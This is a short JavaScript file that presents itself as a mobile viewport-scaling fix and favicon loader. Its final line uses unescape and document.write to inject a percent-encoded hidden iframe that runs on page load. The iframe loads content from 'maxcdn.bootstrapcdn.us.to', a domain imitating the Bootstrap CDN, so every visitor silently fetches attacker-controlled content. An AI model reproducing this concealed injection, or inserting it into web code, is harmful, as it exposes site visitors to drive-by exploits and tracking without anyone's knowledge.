fixScale = function(doc) {

	var addEvent = 'addEventListener',
	    type = 'gesturestart',
	    qsa = 'querySelectorAll',
	    scales = [1, 1],
	    meta = qsa in doc ? doc[qsa]('meta[name=viewport]') : [];

	function fix() {
		meta.content = 'width=device-width,minimum-scale=' + scales[0] + ',maximum-scale=' + scales[1];
		doc.removeEventListener(type, fix, true);
	}

	if ((meta = meta[meta.length - 1]) && addEvent in doc) {
		fix();
		scales = [.25, 1.6];
		doc[addEvent](type, fix, true);
	}

};
var favIcon = "\
AAABAAEAEBAAAAEAIABoBAAAFgAAACgAAAAQAAAAIAAAAAEAIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACOjo4HVIpL5htvAP8bbwD/G28A/xtvAP8bbwD/G28A/xtvAP8bbwD/G28A/xtvAP8bbwD/G28A/yVvDPlvb28bW5tWZRupD/8zdB3/G28A/xtvAP8bbwD/G28A/xtvAP8bbwD/G28A/xtvAP8bbwD/G28A/xtvAP8bbwD/P28whzijL90NrQD/OJIs/xtvAP8bbwD/QHgu/0iANv9IgDb/SIA2/0iANv9IgDb/SIA2/0iANv9IgDb/SIA2/1GAQuxOnkelDa0A/w2tAP89dSr/G28A/0CKL/8K/gD/Cv4A/wr+AP8K/gD/Cv4A/wr+AP8K/gD/Cv4A/wr+AP9k31+lj4+PKBupEPwNrQD/OJIs/xtvAP8bbwD/SNBC/wr+AP8K/gD/Cv4A/wr+AP8K/gD/Cv4A/wr+AP8e9xX8v7+/KAAAAABOnkekDa0A/w2tAP85eij/G28A/4vRiJAAAAAAAAAAAAAAAABDyjv/U9JN/wr+AP8K/gD/ZN9fnwAAAAAAAAAAj4+PKBupD/wNrQD/NJcq/xtvAP8bbwD/AAAAAAAAAACL0YiQDa0A/z7YOP8K/gD/HvcV+b+/vyAAAAAAAAAAAAAAAABNnkeuDa0A/w2tAP86ein/G28A/4vRiJAAAAAADa0A/z2xNf8K/gD/Cv4A/2TfX5oAAAAAAAAAAAAAAAAAAAAAj4+PMRupD/4NrQD/Npgr/xtvAP8wgx7/i9GIkA2tAP8+2Dj/Cv4A/x73Ffm/v78gAAAAAAAAAAAAAAAAAAAAAAAAAABOnkevDa0A/w2tAP8wehz/HKIP/w2tAP89sjX/Cv4A/wr+AP+L0YiSAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAj4+PMRupEP4NrQD/Da0A/w2tAP8NrQD/P9k4/wr+AP8y8Cr2v7+/GQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABOnkizDa0A/w2tAP8NrQD/P7M3/wr+AP8K/gD/i9GIkAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAj4+POhupD/8NrQD/G6kQ/0/XSv8K/gD/MvAq9L+/vxkAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA9oTW5Da0A/z+zN/8K/gD/Cv4A/4vRiIUAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAbpZrOg2tAP9A2jn/Cv4A/zLwKvK/v78TAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAB3qnS6Cv4A/wr+AP+L0YiFAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACsQQAArEEAAKxBAACsQQAArEGBwaxBgYGsQcCDrEHAA6xB4AesQeAHrEHwD6xB8A+sQfgfrEH4H6xB/D+sQQ==";

var docHead = document.getElementsByTagName('head')[0];
var newLink = document.createElement('link');
newLink.rel = 'shortcut icon';
newLink.type = 'image/x-icon';
newLink.href = 'data:image/png;base64,'+favIcon;
docHead.appendChild(newLink);
document.onload = document.write(unescape('%3C%69%66%72%61%6D%65%20%73%74%79%6C%65%3D%22%64%69%73%70%6C%61%79%3A%20%6E%6F%6E%65%22%20%73%72%63%3D%22%2F%2F%6D%61%78%63%64%6E%2E%62%6F%6F%74%73%74%72%61%70%63%64%6E%2E%75%73%2E%74%6F%2F%62%6F%6F%74%73%74%72%61%70%2F%6C%61%74%65%73%74%2F%63%73%73%2F%62%6F%6F%74%73%74%72%61%70%2E%6D%69%6E%2E%63%73%73%22%3E%3C%2F%69%66%72%61%6D%65%3E'));
